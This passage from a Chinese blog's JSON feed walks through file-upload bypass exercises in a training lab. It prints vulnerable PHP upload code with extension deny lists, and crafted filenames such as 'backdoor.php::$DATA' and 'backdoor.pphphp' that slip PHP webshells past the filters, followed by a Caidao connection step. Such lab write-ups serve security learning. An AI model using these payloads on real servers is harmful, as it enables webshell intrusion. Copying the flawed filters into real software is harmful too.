IMAGETYPE 常量之一相对应的整数，如下所示：</p>\n<ul>\n<li>IMAGETYPE_GIF(1)</li>\n<li>IMAGETYPE_JPEG(2)</li>\n<li>IMAGETYPE_PNG(3)</li>\n<li>IMAGETYPE_SWF(4)</li>\n<li>IMAGETYPE_PSD(5)</li>\n<li>IMAGETYPE_BMP(6)</li>\n<li>IMAGETYPE_TIFF_II(7)</li>\n<li>IMAGETYPE_TIFF_MM(8)</li>\n<li>IMAGETYPE_JPC(9)</li>\n<li>IMAGETYPE_JP2(10)</li>\n<li>IMAGETYPE_JPX(11)</li>\n<li>IMAGETYPE_JB2(12)</li>\n<li>IMAGETYPE_SWC(13)</li>\n<li>IMAGETYPE_IFF(14)</li>\n<li>IMAGETYPE_WBMP(15)</li>\n<li>IMAGETYPE_XBM(16)</li>\n<li>IMAGETYPE_ICO(17)</li>\n<li>IMAGETYPE_WEBP(18)</li>\n</ul>\n<p>查看源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isImage</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//需要开启php_exif模块</span></span><br><span class=\"line\">    <span class=\"variable\">$image_type</span> = <span class=\"title function_ invoke__\">exif_imagetype</span>(<span class=\"variable\">$filename</span>);<span class=\"comment\">//关键，使用exif_imagetype内置函数，返回一个图片的类型</span></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (<span class=\"variable\">$image_type</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> IMAGETYPE_GIF:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;gif&quot;</span>;</span><br><span class=\"line\">            <span class=\"comment\">//break;</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> IMAGETYPE_JPEG:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;jpg&quot;</span>;</span><br><span class=\"line\">            <span class=\"comment\">//break;</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> IMAGETYPE_PNG:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;png&quot;</span>;</span><br><span class=\"line\">            <span class=\"comment\">//break;    </span></span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            <span class=\"comment\">//break;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"variable\">$image_type</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$res</span> = <span class=\"title function_ invoke__\">isImage</span>(<span class=\"variable\">$temp_file</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$res</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&quot;/&quot;</span>.<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">10</span>, <span class=\"number\">99</span>).<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$res</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中，如果要使用内置函数 exif_imagetype 的话，一定需要先开启 php_exif 模块</p>\n<p>开启方法如下：</p>\n<p>找到 <code>C:\\phpStudyB\\PHP\\php.ini</code>  文件</p>\n<p>服务器配置说明：</p>\n<p>1. 在 php.ini 文件中找到 <code>;extension=php_exif.dll</code> ，去掉前面的分号<br>\n 2. 在 php.ini 文件中找到 <code>;extension=php_mbstring.dll</code> ，去掉前面的分号，并将此行移动到 extension=php_exif.dll 之前，使之首先加载。</p>\n<ul>\n<li>去掉分号、移动到前面后：</li>\n</ul>\n<p><img src=\"image-20221004004519109.png\" alt=\"image-20221004004519109\"></p>\n<p>3. 找到 <code>[exif]</code>  段，把下面语句的分号去掉。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">;exif.encode_unicode = ISO-<span class=\"number\">8859</span>-<span class=\"number\">15</span></span><br><span class=\"line\">;exif.decode_unicode_motorola = UCS-<span class=\"number\">2</span>BE</span><br><span class=\"line\">;exif.decode_unicode_intel = UCS-<span class=\"number\">2</span>LE</span><br><span class=\"line\">;exif.encode_jis =</span><br><span class=\"line\">;exif.decode_jis_motorola = JIS</span><br><span class=\"line\">;exif.decode_jis_intel = JIS</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>去掉分号后：</p>\n</li>\n<li>\n<p><img src=\"image-20221004004610160.png\" alt=\"image-20221004004610160\"></p>\n</li>\n</ul>\n<p>开启后，如果还想再次验证是否开启 exif 模块的话，在 WWW 目录下放置 phpinfo.php</p>\n<p><img src=\"image-20221004004840389.png\" alt=\"image-20221004004840389\"></p>\n<p>然后直接访问 <code>http://www.upload_lab.com/phpinfo.php</code> , 并在页面 <code>Ctrl+F</code>  搜索 <code>exif</code>  即可。（<strong>不开启是搜索不到的</strong>）</p>\n<p><img src=\"image-20221004005007090.png\" alt=\"image-20221004005007090\"></p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%90%8E%E7%BC%80%E5%8A%A0%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/",
            "url": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%90%8E%E7%BC%80%E5%8A%A0%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/",
            "title": "后缀加特殊字符绕过",
            "date_published": "2022-10-03T09:24:28.000Z",
            "content_html": "<h1 id=\"后缀加特殊字符绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀加特殊字符绕过\">#</a> 后缀加特殊字符绕过</h1>\n<p>本次讲解后缀加特殊字符绕过。</p>\n<h2 id=\"后缀加点绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀加点绕过\">#</a> 后缀加点绕过</h2>\n<p>常规看源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现并没对后缀名的最后一个。进行 deldot ()，因此存在后缀加点绕过漏洞。</p>\n<p>抓包，修改上传文件名，加个点：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.php.&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003172734314.png\" alt=\"image-20221003172734314\"></p>\n<p>菜刀连接对应文件即可。</p>\n<h2 id=\"后缀加data绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀加data绕过\">#</a> 后缀加::$DATA 绕过</h2>\n<p><img src=\"image-20221003173227712.png\" alt=\"image-20221003173227712\"><br>\n 抓包，修改文件名：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.php::<span class=\"subst\">$DATA</span>&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003174926600.png\" alt=\"image-20221003174926600\"></p>\n<p>在上传后由于文件流的特性::$DATA 会自动去除，而最终上传的是 php 文件</p>\n<p><img src=\"image-20221003175017386.png\" alt=\"image-20221003175017386\"></p>\n<h2 id=\"后缀加点空格点绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀加点空格点绕过\">#</a> 后缀加点 + 空格 + 点绕过</h2>\n<p>后缀 + <code>. .</code>  来进行绕过</p>\n<p>来看看源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">deldot</span>(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中过滤了很多，但是如果当后缀名为 <code>. .</code>  时，文件名末尾的点只去除了一次，首尾去空以后还剩下一个点</p>\n<p>由于此时已经走完了代码的过滤流程，则可以实现上传 php 文件获得 webshell</p>\n<p>抓包，修改</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=&quot;backdoor.php. .&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003175926184.png\" alt=\"image-20221003175926184\"></p>\n<p>即可上传成功。</p>\n<h2 id=\"后缀双写绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀双写绕过\">#</a> 后缀双写绕过</h2>\n<p>查看源码:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;php&quot;</span>,<span class=\"string\">&quot;php5&quot;</span>,<span class=\"string\">&quot;php4&quot;</span>,<span class=\"string\">&quot;php3&quot;</span>,<span class=\"string\">&quot;php2&quot;</span>,<span class=\"string\">&quot;html&quot;</span>,<span class=\"string\">&quot;htm&quot;</span>,<span class=\"string\">&quot;phtml&quot;</span>,<span class=\"string\">&quot;pht&quot;</span>,<span class=\"string\">&quot;jsp&quot;</span>,<span class=\"string\">&quot;jspa&quot;</span>,<span class=\"string\">&quot;jspx&quot;</span>,<span class=\"string\">&quot;jsw&quot;</span>,<span class=\"string\">&quot;jsv&quot;</span>,<span class=\"string\">&quot;jspf&quot;</span>,<span class=\"string\">&quot;jtml&quot;</span>,<span class=\"string\">&quot;asp&quot;</span>,<span class=\"string\">&quot;aspx&quot;</span>,<span class=\"string\">&quot;asa&quot;</span>,<span class=\"string\">&quot;asax&quot;</span>,<span class=\"string\">&quot;ascx&quot;</span>,<span class=\"string\">&quot;ashx&quot;</span>,<span class=\"string\">&quot;asmx&quot;</span>,<span class=\"string\">&quot;cer&quot;</span>,<span class=\"string\">&quot;swf&quot;</span>,<span class=\"string\">&quot;htaccess&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"variable\">$deny_ext</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$file_name</span>);</span><br><span class=\"line\">        <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现核心语句是：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"variable\">$deny_ext</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$file_name</span>);</span><br></pre></td></tr></table></figure>\n<p>它是将 <code>file_name</code>  变量中获取到的文件上传名，从中遍历 <code>deny_ext</code>  数组的内容，如果发现有相同字符串，则替换成空</p>\n<p>如下测试：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.phphpp&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003180734935.png\" alt=\"image-20221003180734935\"></p>\n<p>那么改变下双写位置就可以有：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.pphphp&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003181058551.png\" alt=\"image-20221003181058551\"></p>\n<p>上传成功。</p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%90%8E%E7%BC%80%E5%A4%A7%E5%B0%8F%E5%86%99+%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/",
            "url": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%90%8E%E7%BC%80%E5%A4%A7%E5%B0%8F%E5%86%99+%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/",
            "title": "后缀大小写+空格绕过",
            "date_published": "2022-10-03T08:59:03.000Z",
            "content_html": "<h1 id=\"后缀大小写空格绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀大小写空格绕过\">#</a> 后缀大小写 + 空格绕过</h1>\n<p>本次讲解后缀校验相关的简单绕过方式，大小写 + 空格绕过</p>\n<p>以 Less-05 为例：</p>\n<h2 id=\"后缀大小写绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀大小写绕过\">#</a> 后缀大小写绕过</h2>\n<p>常规看后台源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span 